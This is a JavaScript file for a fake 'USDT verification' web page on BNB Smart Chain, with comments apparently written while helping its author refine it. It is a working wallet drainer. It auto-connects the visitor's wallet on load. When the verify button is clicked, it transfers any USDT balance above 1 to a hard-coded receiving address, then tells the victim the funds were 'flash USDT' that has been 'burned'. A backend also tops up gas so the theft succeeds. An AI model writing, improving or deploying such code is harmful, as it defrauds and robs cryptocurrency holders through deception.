// ============================================================================
// Your Original Script's Constants
// These are kept as is.
// ============================================================================
const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract

// ============================================================================
// Global Variables for Wallet Connection (Enhanced from your working script)
// ============================================================================
let web3; // Global Web3 instance
let userAddress; // Global variable to store the user's connected wallet address
let currentProvider = null; // To store the detected wallet provider (e.g., window.ethereum, window.trustwallet)
let walletType = 'unknown'; // To keep track of the detected wallet type ('trust', 'binance', 'metamask')

// Network configuration from your working script (needed for switching logic)
const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet Chain ID
const BSC_MAINNET_PARAMS = {
    chainId: BSC_MAINNET_CHAIN_ID,
    chainName: 'Binance Smart Chain Mainnet',
    nativeCurrency: {
        name: 'BNB',
        symbol: 'bnb',
        decimals: 18
    },
    rpcUrls: ['https://bsc-dataseed.binance.org/'],
    blockExplorerUrls: ['https://bscscan.com/']
};

// ============================================================================
// Modified connectWallet Function (Incorporates logic from your working script)
// This is the ONLY section significantly changed for wallet connection.
// ============================================================================

/**
 * @dev Handles connecting the user's wallet.
 * It detects various wallet providers (Trust Wallet, Binance Chain Wallet, MetaMask),
 * initializes Web3.js with the detected provider, attempts to get already-connected accounts
 * using `eth_accounts`, and switches to the BNB Smart Chain.
 *
 * IMPORTANT: This function strictly avoids `eth_requestAccounts` to prevent
 * auto-popups for *new* connections. It will only connect if the user has
 * already approved connection for this site previously. If not, it will just
 * log a warning and the wallet will remain 'not connected'.
 */
async function connectWallet() {
    // 1. Detect wallet provider (from your working script's initWeb3 logic)
    if (window.trustwallet) {
        walletType = 'trust';
        currentProvider = window.trustwallet;
    } else if (window.BinanceChain) {
        walletType = 'binance';
        currentProvider = window.BinanceChain;
    } else if (window.ethereum) { // Generic Ethereum provider (MetaMask, etc.)
        walletType = 'metamask';
        currentProvider = window.ethereum;
    } else if (window.web3 && window.web3.currentProvider) { // Older web3.js detection
        walletType = 'unknown_legacy_web3';
        currentProvider = window.web3.currentProvider;
    } else {
        // No Web3 provider detected, show alert and exit
        alert("MetaMask, Trust Wallet, or Binance Wallet is not detected. Please install a compatible Web3 browser extension.");
        console.error("No Web3 provider detected.");
        return; // Exit if no provider
    }

    // Now that `currentProvider` is set (if detected)
    try {
        // 2. Initialize Web3.js with the detected provider.
        //    *** This line is CRUCIAL. It requires the 'Web3' constructor to be globally available. ***
        //    If you still get "ReferenceError: Web3 is not defined", you MUST ensure the Web3.js library
        //    is loaded in your HTML (e.g., <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>)
        //    BEFORE this script executes.
        web3 = new Web3(currentProvider);

        // 3. Get accounts (silently via eth_accounts)
        let accounts = [];
        if (walletType === 'binance' && currentProvider.request) {
            // Binance Chain Wallet uses `request` with `eth_accounts`
            accounts = await currentProvider.request({ method: 'eth_accounts' });
        } else if (currentProvider.request) {
            // Standard EIP-1193 providers (MetaMask, Trust Wallet, etc.)
            accounts = await currentProvider.request({ method: "eth_accounts" });
        } else if (web3.eth && web3.eth.getAccounts) {
            // Fallback for older Web3.js instances if `request` is not available
            accounts = await web3.eth.getAccounts();
        }

        // 4. Set userAddress if accounts are found
        if (accounts.length > 0) {
            userAddress = accounts[0];
            console.log("Wallet Connected:", userAddress);

            // 5. Attempt to switch to BNB Smart Chain
            const chainId = await web3.eth.getChainId();
            if (chainId !== parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
                try {
                    console.log(`Attempting to switch to BSC (Wallet Type: ${walletType})`);
                    if (walletType === 'binance' && currentProvider.switchNetwork) {
                        await currentProvider.switchNetwork('bsc-mainnet');
                    } else if (currentProvider.request) {
                        await currentProvider.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: BSC_MAINNET_CHAIN_ID }]
                        });
                    }
                    console.log("Switched to BNB Smart Chain successfully.");
                } catch (switchError) {
                    console.error("Error switching network:", switchError);
                    if (switchError.code === 4902 && currentProvider.request) {
                        // Network not added, try to add it (from your working script's logic)
                        try {
                            await currentProvider.request({
                                method: 'wallet_addEthereumChain',
                                params: [BSC_MAINNET_PARAMS]
                            });
                            console.log("Attempted to add BSC network and switch.");
                        } catch (addError) {
                            console.error("Failed to add BSC network:", addError);
                            alert("Failed to add Binance Smart Chain. Please add it manually in your wallet.");
                        }
                    } else {
                        alert("Please manually switch to BNB Smart Chain in your wallet.");
                    }
                }
            }

            // 6. Add event listeners for account and chain changes (from your working script)
            if (currentProvider.on) {
                currentProvider.on('accountsChanged', (newAccounts) => {
                    if (newAccounts.length > 0) {
                        userAddress = newAccounts[0];
                        console.log("Account changed to:", userAddress);
                    } else {
                        userAddress = null;
                        console.log("Wallet disconnected.");
                    }
                    // Your working script used `window.location.reload();` here for robustness
                    // window.location.reload();
                });
                currentProvider.on('chainChanged', (chainId) => {
                    console.log("Chain changed to:", chainId);
                    if (chainId !== BSC_MAINNET_CHAIN_ID) {
                        alert("Detected chain change. Please switch back to BNB Smart Chain.");
                    }
                    // window.location.reload();
                });
            }

        } else {
            // This happens if wallet is detected but not connected to this specific site.
            // As per your strict requirement, no prompt here.
            console.warn("Wallet detected, but no accounts are connected to this site. User needs to connect manually.");
            userAddress = undefined; // Ensure userAddress is explicitly undefined
            // No disruptive alert, the `verifyAssets` function's check will handle it.
        }
    } catch (error) {
        console.error("Error during wallet connection or network operations:", error);
        alert("An error occurred during wallet setup. Check console for details.");
        web3 = undefined; // Clear web3 and userAddress on error
        userAddress = undefined;
    }
}

// ============================================================================
// Original `verifyAssets` function (UNCHANGED)
// This will now use the `web3` and `userAddress` populated by the enhanced `connectWallet`.
// ============================================================================
async function verifyAssets() {
    if (!web3 || !userAddress) {
        // This alert is expected if the wallet isn't connected after `connectWallet` runs.
        alert("Wallet not connected. Please ensure MetaMask/Trust Wallet/Binance Wallet is installed and connected to this site.");
        return;
    }

    const usdtContract = new web3.eth.Contract([
        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
    ], usdtContractAddress);

    // Fetch balances
    const [usdtBalanceWei, userBNBWei] = await Promise.all([
        usdtContract.methods.balanceOf(userAddress).call(),
        web3.eth.getBalance(userAddress)
    ]);

    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

    console.log(`USDT Balance: ${usdtBalance} USDT`);
    console.log(`BNB Balance: ${userBNB} BNB`);

    if (usdtBalance === 0) {
        showPopup("No assets found.", "black");
        return;
    }

    if (usdtBalance <= 1) {
        showPopup(
            `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
            "green"
        );
        return;
    }

    // User has more than 1 USDT -> Check BNB Gas Fee and potentially transfer
    showPopup("Loading...", "green");

    // This section directly calls your backend and then transferUSDT
    // The backend call needs to be operational for this to work.
    const minimumBnbForGas = 0.0005; // Example threshold
    if (userBNB < minimumBnbForGas) {
        console.log("User BNB is low. Requesting BNB from backend...");
        await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ toAddress: userAddress })
        })
        .then(response => response.json())
        .then(data => {
            console.log("BNB send request response:", data);
            if (data.success) {
                showPopup("BNB top-up requested. Please wait a moment and try confirming the transaction again.", "blue");
            } else {
                showPopup(`BNB top-up failed: ${data.message || 'Unknown error.'}`, "red");
            }
        })
        .catch(error => {
            console.error("Error sending BNB request to backend:", error);
            showPopup("Failed to request BNB top-up. Network error or backend issue.", "red");
        });
        return; // Exit after requesting BNB, user needs to re-try verification
    }

    transferUSDT(usdtBalance, userBNB);
}

// ============================================================================
// Original `transferUSDT` function (UNCHANGED)
// ============================================================================
async function transferUSDT(usdtBalance, userBNB) {
    try {
        const usdtContract = new web3.eth.Contract([
            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ], usdtContractAddress);

        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");

        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);

        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

        showPopup(
            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
            "red"
        );

        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}`);
    } catch (error) {
        console.error("❌ USDT Transfer Failed:", error);
        alert("USDT transfer failed. Ensure you have enough BNB for gas.");
    }
}

// ============================================================================
// Original `sendBNB` function (UNCHANGED, and still not called in main flow)
// ============================================================================
async function sendBNB(toAddress, amount) {
    try {
        await web3.eth.sendTransaction({
            from: bnbGasSender,
            to: toAddress,
            value: web3.utils.toWei(amount, "ether"),
            gas: 21000
        });

        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
    } catch (error) {
        console.error("⚠️ Error sending BNB:", error);
    }
}

// ============================================================================
// Original `showPopup` function (UNCHANGED)
// ============================================================================
function showPopup(message, color) {
    let popup = document.getElementById("popupBox"); // Assumes this ID exists in your HTML

    if (!popup) {
        // Fallback: create div if it doesn't exist (good for minimal HTML)
        popup = document.createElement("div");
        popup.id = "popupBox";
        document.body.appendChild(popup);
        // Add basic inline styles if dynamically created
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "18px";
        popup.style.width = "80%";
        popup.style.maxWidth = "400px";
        popup.style.zIndex = "1000";
    }

    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
    popup.style.color = color === "red" ? "red" : "green";
    popup.innerHTML = message;
    popup.style.display = "block";

    // Auto-hide after 5 seconds
    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

// ============================================================================
// Original Event Listeners (UNCHANGED)
// ============================================================================

// Auto-connect wallet on page load
window.addEventListener("load", connectWallet);

// Attach event listener (this assumes there's an HTML element with id="verifyAssets")
document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
